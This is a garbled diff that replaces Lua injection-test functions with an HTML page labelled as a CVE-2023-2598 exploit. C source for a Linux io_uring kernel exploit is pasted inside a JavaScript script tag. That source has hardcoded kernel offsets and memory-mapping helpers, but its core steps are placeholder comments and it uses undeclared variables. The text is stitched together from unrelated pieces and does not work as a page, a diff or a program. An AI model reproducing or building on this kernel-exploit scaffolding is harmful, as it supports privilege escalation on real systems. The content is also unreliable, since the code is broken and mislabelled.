@@ -1,36 +1,98 @@
-```html
 <!DOCTYPE html>
 <html>
--- Optimize string formatting for better performance
-function lua_check()
-	local message = string.format("Lua injection success!\nLua version: %s", _VERSION)
-	e:tag{"dialog", title="", message=message}
-end
+<head>
+    <title>CVE-2023-2598 Exploit by anatomic (@YordanStoychev)</title>
+</head>
+<body>
+    <script>
+        console.log("[*] CVE-2023-2598 Exploit by anatomic (@YordanStoychev)");
 
-function luasocket_check()
-	local success, socket = pcall(require, "socket")
+        // Your JavaScript code goes here
 
-	if success then
-		e:tag{"dialog", title="", message="Luasocket is available!"}
-	else
-		e:tag{"dialog", title="", message="Error: Luasocket is not available!"}
-	end
-end
+        #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <liburing.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <syscall.h>
+#include <sched.h>
+#include <sys/resource.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <assert.h>
+#include <mqueue.h>
 
-function file_write()
-	local content = "Hello, this is some content to write to the file."
-	local savepath = e:var("s.savepath")
-	local filename = savepath .. "/filetest.txt"
-	
-	local file = io.open(filename, "wb")
-	if file then
-		-- Use a buffer for writing to the file
-		file:write(content)
-		file:close()
-		local message = string.format("Successfully wrote to %s", filename)
-		e:tag{"dialog", title="", message=message}
-	else
-		local message = string.format("Error: Unable to open file %s", filename)
-		e:tag{"dialog", title="", message=message}
-	end
-end
+#define PAGE_SIZE 0x1000
+#define QD 4
+#define sock_def_readable 0xb503f0
+#define sk_data_ready_off 680
+#define TCP_OFFSET 1400
+#define IOCTL_OFFSET 40
+#define L1_CACHE_SHIFT 6
+#define sk_buff_size 224
+#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))
+#define PROTO_SIZE 432
+
+#define target_tty_dev "/dev/ttyS0"
+
+int setup_memfd_page(char* name, int real_pages){
+    int memfd = memfd_create(name, MFD_CLOEXEC);
+    fallocate(memfd, 0, 0, real_pages * PAGE_SIZE);
+    return memfd;
+}
+
+void* vmap_shallow_pages(int nr_pages, int memfd){
+    uint64_t start = 0x4247000000;
+    for(int i = 0; i < nr_pages; i++){
+        if(mmap(start+i*PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, memfd, 0) < 0){
+            perror("Failed to mmap a page");
+            exit(0);
+        }
+    }
+    return (void*) start;
+}
+
+void exit_err(char *str){
+    puts(str);
+    exit(1);
+}
+
+int main(){
+    // Initialization and setup code here
+
+    for(int i = 0; i < nr_memfds && success == 0; i++){
+        // Main search and exploit logic here
+
+        for(int v_off = 0; v_off < (nr_maps - block_size); v_off = v_off + block_size){
+            // Exploit code and buffer manipulation here
+
+            // Post-exploitation cleanup
+            memcpy(receiver_buffer, backup, sz_tcp_sock); 
+
+            // Unregister buffers and cleanup operations
+            // Combine the cleanup for sockets and memfds to efficiently handle resources
+        }
+    }
+
+    // Cleanup remaining resources outside the loop
+    for (int i = 0; i < nr_sockets; i++) {
+        close(sockets[i]);
+    }
+    for(int i = 0; i < nr_memfds; i++){
+        close(memfds[i]);
+    }
+    munmap(receiver_buffer, block_size * PAGE_SIZE);
+    close(receiver_fd);
+
+    // Keep the program running for monitoring purposes
+    while(true)
+        sleep(60);
+
+    return 0;
+    
+
+    </script>
+</body>
+</html>
